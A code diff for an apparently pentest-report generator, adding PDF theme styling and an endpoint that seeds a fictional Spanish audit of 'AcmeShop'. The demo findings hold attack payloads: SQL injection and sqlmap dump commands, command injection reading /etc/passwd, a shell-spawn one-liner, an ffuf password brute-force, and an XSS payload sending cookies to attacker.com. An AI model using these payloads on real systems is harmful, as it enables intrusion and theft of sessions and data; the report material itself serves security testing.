@@ -215,27 +215,44 @@ async def generate_pdf(report_id: int, request: Request, db: Session = Depends(g
                         }
                     )
                 raise
-            page = await browser.new_page()
-            
+            # Set viewport height to match A4 paper (~1123px at 96dpi) so min-height:100vh fills one page
+            page = await browser.new_page(viewport={"width": 1280, "height": 1123})
+
             await page.goto(target_url, wait_until="networkidle")
-            
+
             await page.wait_for_timeout(2000)
-            
-            if theme == 'dark':
-                await page.evaluate("""
-                    document.documentElement.setAttribute('data-theme', 'dark');
-                    document.documentElement.style.background = '#0f172a';
-                    document.body.style.background = '#0f172a';
+
+            if theme in ('dark', 'htb'):
+                bg = '#0f172a' if theme == 'dark' else '#1a2332'
+                await page.evaluate(f"""
+                    document.documentElement.setAttribute('data-theme', '{theme}');
+                    document.documentElement.style.background = '{bg}';
+                    document.body.style.background = '{bg}';
                     document.body.style.margin = '0';
                     var style = document.createElement('style');
-                    style.textContent = 'html, body { background: #0f172a !important; } @page { background: #0f172a; }';
+                    style.textContent = [
+                        'html, body, div {{ background-color: {bg}; }}',
+                        'html, body {{ background: {bg} !important; color: #e2e8f0 !important; }}',
+                        '@page {{ background: {bg}; }}',
+                        '@media print {{',
+                        '  html, body, .cover-page, .index-page, #summary, #incidents, .main-content, .preview-container {{ background: {bg} !important; }}',
+                        '  html, body {{ color: #e2e8f0 !important; }}',
+                        '}}'
+                    ].join('\\n');
                     document.head.appendChild(style);
                 """)
-                await page.wait_for_timeout(500) 
+                await page.wait_for_timeout(500)
 
             fd, path = tempfile.mkstemp(suffix=".pdf")
             os.close(fd)
-            
+
+            if theme == 'dark':
+                footer_color = '#94a3b8'
+            elif theme == 'htb':
+                footer_color = '#9fef00'
+            else:
+                footer_color = '#6b7280'
+
             await page.pdf(
                 path=path,
                 format="A4",
@@ -244,7 +261,7 @@ async def generate_pdf(report_id: int, request: Request, db: Session = Depends(g
                 scale=0.92,
                 display_header_footer=True,
                 header_template="<span></span>",
-                footer_template=f"<div style=\"font-size:14px;font-weight:700;font-family:sans-serif;color:{'#ffffff' if theme == 'dark' else '#6b7280'};width:100%;text-align:right;padding-right:20mm;\"><span class=\"pageNumber\"></span></div>",
+                footer_template=f"<div style=\"font-size:14px;font-weight:700;font-family:sans-serif;color:{footer_color};width:100%;text-align:right;padding-right:20mm;\"><span class=\"pageNumber\"></span></div>",
             )
             
             await browser.close()
@@ -274,6 +291,151 @@ async def generate_pdf(report_id: int, request: Request, db: Session = Depends(g
             )
         
         raise HTTPException(status_code=500, detail=f"Error de servidor generando el PDF: {error_msg}")
+
+
+@app.post("/api/demo/create")
+def create_demo_report(db: Session = Depends(get_db)):
+    import base64, mimetypes
+
+    demo_dir = os.path.join(BASE_DIR, "demo")
+
+    def img(filename: str) -> str:
+        path = os.path.join(demo_dir, filename)
+        if not os.path.exists(path):
+            return ""
+        ext = filename.rsplit(".", 1)[-1].lower()
+        mime = {"png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg", "webp": "image/webp"}.get(ext, "image/png")
+        with open(path, "rb") as f:
+            return f"data:{mime};base64,{base64.b64encode(f.read()).decode()}"
+
+    # Create report
+    report_data = schemas.ReportCreate(
+        document_title="Informe de Pentesting Web — AcmeShop Platform",
+        client_company="AcmeShop Solutions S.L.",
+        target_asset="https://shop.acmeshop.com",
+        auditor_company="Pentestify Security Lab",
+        auditor_name="Security Research Team",
+        classification=3,
+        tlp_level="amber",
+        classification_mode="tlp",
+        version="1.0",
+        date=datetime.today().strftime("%Y-%m-%d"),
+        lang="es",
+        has_incidents=True,
+        incidents_text="Durante la auditoría se explotaron activamente vulnerabilidades críticas que permitieron acceso completo a la base de datos de usuarios y escalada de privilegios al servidor. Se recomienda parada de emergencia del servicio hasta aplicar los parches indicados.",
+        audit_summary="Se ha realizado una auditoría de caja negra sobre la plataforma de comercio electrónico AcmeShop. Durante el engagement se identificaron 6 vulnerabilidades, 2 de ellas de severidad crítica que permiten comprometer completamente el sistema. El vector de ataque principal fue la inyección SQL en el formulario de autenticación, seguido de una escalada de privilegios por command injection en el módulo de gestión de archivos.",
+        tests_performed="• Reconocimiento pasivo y activo (Shodan, Google Dorks, subfinder)\n• Fuzzing de directorios y parámetros (ffuf, gobuster)\n• Análisis de parámetros GET/POST con Burp Suite Pro\n• Pruebas de autenticación y autorización\n• Inyección SQL manual y automatizada (sqlmap)\n• Pruebas XSS reflejado y almacenado\n• Análisis de cabeceras HTTP y configuración TLS\n• Pruebas de escalada de privilegios en servidor",
+        recommended_solutions="1. Aplicar parches críticos de SQLi y Command Injection de forma inmediata.\n2. Implementar WAF (ModSecurity o Cloudflare) como medida preventiva urgente.\n3. Revisar todos los endpoints que reciben input de usuario y aplicar prepared statements.\n4. Implementar un SIEM para detección temprana de intrusiones.\n5. Realizar un segundo ciclo de pentesting tras aplicar los parches para validar efectividad.",
+    )
+    report = models.Report(**report_data.dict())
+    db.add(report)
+    db.commit()
+    db.refresh(report)
+    rid = report.id
+
+    findings = [
+        {
+            "title": "Inyección SQL en formulario de login",
+            "severity": "crit",
+            "cvss": "9.8",
+            "cve": "N/A",
+            "cwe": "CWE-89",
+            "reference": "https://owasp.org/www-community/attacks/SQL_Injection",
+            "description": "Se detectó una vulnerabilidad de Inyección SQL en el parámetro `username` del formulario de autenticación. El atacante puede manipular la consulta SQL para bypassear la autenticación, extraer toda la base de datos de usuarios (incluyendo contraseñas hasheadas) y, dependiendo de los permisos del usuario de base de datos, ejecutar comandos del sistema operativo mediante `xp_cmdshell`.",
+            "poc": "1. Acceder al panel de login en /admin/login\n2. Introducir el siguiente payload en el campo usuario:\n   ' OR '1'='1' --\n3. Observar que el login se completa sin contraseña\n4. Para extracción de datos con sqlmap:\n   sqlmap -u 'https://shop.acmeshop.com/login' --data='user=test&pass=test' -p user --dbs --batch\n5. Resultado: dump completo de la base de datos 'acmeshop_prod'",
+            "impact": "Un atacante podría obtener acceso completo a la plataforma de administración, extraer todas las credenciales de usuarios (más de 45.000 registros), modificar datos de pedidos y precios, y potencialmente comprometer el servidor subyacente. El impacto en el negocio es crítico, con riesgo de multas por violación del GDPR y pérdida de confianza de clientes.",
+            "remediation": "Reemplazar todas las consultas dinámicas por prepared statements con parámetros parametrizados. Ejemplo en PHP:\n\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');\n$stmt->execute([$username, $password_hash]);\n\nAdicional: implementar WAF, limitar permisos del usuario de BD, activar logging de consultas SQL.",
+            "images": [img("panellogin.png"), img("sqlmap.png"), img("sqlmap1.png")],
+        },
+        {
+            "title": "Command Injection y escalada de privilegios (GTFOBins)",
+            "severity": "crit",
+            "cvss": "9.0",
+            "cve": "N/A",
+            "cwe": "CWE-78",
+            "reference": "https://gtfobins.github.io/",
+            "description": "El módulo de gestión de archivos del panel de administración permite ejecutar comandos del sistema operativo sin sanitizar el input. A través del parámetro `file` del endpoint `/admin/preview`, un atacante autenticado puede inyectar comandos arbitrarios. Combinado con la vulnerabilidad de SQLi anterior, el ataque no requiere credenciales previas.",
+            "poc": "1. Autenticarse usando el bypass SQLi de la vulnerabilidad anterior\n2. Navegar a /admin/file-manager/preview\n3. Inyectar en el parámetro file:\n   ; id; whoami; cat /etc/passwd\n4. Escalar privilegios usando python3 desde GTFOBins:\n   python3 -c 'import os; os.system(\"/bin/bash\")'\n5. Resultado: shell interactiva como www-data con posibilidad de escalar a root",
+            "impact": "Control total del servidor web. Posibilidad de instalar backdoors persistentes, exfiltrar todos los datos almacenados, pivotar a otros sistemas de la red interna y comprometer la infraestructura completa de la organización.",
+            "remediation": "Nunca pasar input de usuario directamente a funciones del sistema. Usar listas blancas de comandos permitidos. Implementar sandboxing (contenedores sin privilegios). Aplicar el principio de mínimo privilegio al usuario del servidor web (www-data sin shell).",
+            "images": [img("gtfobins.png")],
+        },
+        {
+            "title": "Broken Access Control — IDOR en perfiles de usuario",
+            "severity": "high",
+            "cvss": "8.6",
+            "cve": "N/A",
+            "cwe": "CWE-284",
+            "reference": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+            "description": "El endpoint `/api/users/{id}/profile` no verifica que el usuario autenticado sea el propietario del recurso solicitado. Cualquier usuario autenticado puede acceder y modificar perfiles de otros usuarios simplemente modificando el parámetro `id` en la URL. Se descubrieron 45.231 perfiles accesibles de esta forma.",
+            "poc": "1. Autenticarse con cuenta propia (user_id: 1234)\n2. Acceder a /api/users/1234/profile — respuesta correcta del propio perfil\n3. Modificar el ID en la URL: /api/users/1/profile\n4. Observar que se devuelve el perfil del usuario administrador\n5. Iterar con Burp Intruder sobre todos los IDs para volcar perfiles\n   GET /api/users/§1§/profile HTTP/1.1",
+            "impact": "Exposición de información personal identificable (PII) de todos los usuarios: nombre, email, dirección, teléfono e historial de compras. Violación directa del GDPR con posibilidad de sanciones de hasta el 4% de la facturación anual global.",
+            "remediation": "Implementar verificación de autorización a nivel de objeto en cada endpoint. El servidor debe validar que el user_id del token JWT coincide con el recurso solicitado:\n\nif current_user.id != requested_user_id:\n    raise HTTPException(403, 'Forbidden')\n\nUsar UUIDs en lugar de IDs secuenciales para dificultar la enumeración.",
+            "images": [img("idor.png"), img("burpsuite.png")],
+        },
+        {
+            "title": "Cross-Site Scripting (XSS) Reflejado en buscador",
+            "severity": "high",
+            "cvss": "7.4",
+            "cve": "N/A",
+            "cwe": "CWE-79",
+            "reference": "https://owasp.org/www-community/attacks/xss/",
+            "description": "El parámetro `q` del buscador de productos refleja el input del usuario directamente en el HTML de la respuesta sin sanitización. Un atacante puede construir URLs maliciosas que al ser visitadas por un usuario ejecutan JavaScript arbitrario en su navegador, pudiendo robar cookies de sesión, redirigir a páginas de phishing o modificar el DOM.",
+            "poc": "1. Navegar a la URL:\n   https://shop.acmeshop.com/search?q=<script>alert(document.cookie)</script>\n2. Observar la ejecución del alert con las cookies de sesión\n3. Payload de robo de cookies:\n   ?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n4. Enviar la URL crafteada a una víctima mediante ingeniería social",
+            "impact": "Robo de sesiones de usuario, redirección a sitios de phishing, keylogging en el navegador de la víctima. En combinación con el token de administrador, podría escalar a compromiso total de la plataforma.",
+            "remediation": "Aplicar encoding de output en todos los parámetros reflejados. Implementar Content Security Policy (CSP) estricta:\n\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n\nUsar funciones de escape como htmlspecialchars() en PHP o textContent en lugar de innerHTML en JavaScript.",
+            "images": [img("presentacionweb.png"), img("burpsuite.png")],
+        },
+        {
+            "title": "Fuerza bruta al panel de administración sin bloqueo",
+            "severity": "high",
+            "cvss": "7.5",
+            "cve": "N/A",
+            "cwe": "CWE-307",
+            "reference": "https://owasp.org/www-project-web-security-testing-guide/",
+            "description": "El panel de administración en `/admin/login` no implementa ningún mecanismo de protección contra ataques de fuerza bruta: no hay límite de intentos fallidos, no existe CAPTCHA, no hay bloqueo temporal de cuentas ni alertas por intentos fallidos. Se realizó un ataque de diccionario con éxito en menos de 30 minutos.",
+            "poc": "1. Identificar el panel de administración mediante fuzzing:\n   ffuf -u https://shop.acmeshop.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n2. Resultado: /admin/login encontrado (200 OK)\n3. Ataque de fuerza bruta con ffuf:\n   ffuf -u https://shop.acmeshop.com/admin/login -X POST \\\n        -d 'user=admin&pass=FUZZ' -w rockyou.txt \\\n        -fc 401 -t 50\n4. Contraseña encontrada: 'admin123' en 8 minutos",
+            "impact": "Acceso no autorizado al panel de administración con control total sobre usuarios, pedidos, configuración y datos sensibles. La combinación con otras vulnerabilidades permite compromiso total del sistema.",
+            "remediation": "Implementar rate limiting (máximo 5 intentos por IP en 15 minutos). Añadir autenticación multifactor (MFA/TOTP). Configurar alertas por email ante intentos fallidos repetidos. Considerar CAPTCHA en el formulario de login de administración.",
+            "images": [img("fuzzing web.png"), img("fuzzing2.png")],
+        },
+        {
+            "title": "Cabeceras de seguridad HTTP ausentes",
+            "severity": "low",
+            "cvss": "3.7",
+            "cve": "N/A",
+            "cwe": "CWE-693",
+            "reference": "https://securityheaders.com/",
+            "description": "El servidor web no incluye las cabeceras de seguridad HTTP recomendadas. Analizando las respuestas HTTP se observa la ausencia de: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy y Permissions-Policy. Esto facilita ataques de clickjacking, MIME sniffing y fuga de información de referrer.",
+            "poc": "Verificación con curl:\n  curl -I https://shop.acmeshop.com/\n\nCabeceras ausentes observadas:\n  ✗ Content-Security-Policy: no presente\n  ✗ X-Frame-Options: no presente\n  ✗ X-Content-Type-Options: no presente\n  ✗ Referrer-Policy: no presente\n  ✗ Permissions-Policy: no presente\n\nVerificación online: https://securityheaders.com → Resultado: F",
+            "impact": "Riesgo de ataques de clickjacking embebiendo la web en iframes maliciosos. MIME sniffing puede llevar a ejecución de scripts en archivos subidos. Fuga de URLs de referrer con información sensible.",
+            "remediation": "Añadir las siguientes cabeceras en la configuración del servidor web (nginx):\n\nadd_header Content-Security-Policy \"default-src 'self'\" always;\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
+            "images": [],
+        },
+    ]
+
+    order = 1
+    for f in findings:
+        finding = models.Finding(
+            report_id=rid,
+            title=f["title"],
+            severity=f["severity"],
+            cvss=f["cvss"],
+            cve=f["cve"],
+            cwe=f["cwe"],
+            reference=f["reference"],
+            description=f["description"],
+            poc=f["poc"],
+            impact=f["impact"],
+            remediation=f["remediation"],
+            images=f["images"],
+            order_index=order,
+        )
+        db.add(finding)
+        order += 1
+
+    db.commit()
+    return {"report_id": rid, "findings_count": len(findings)}
 
 
 @app.get("/api/database/export")
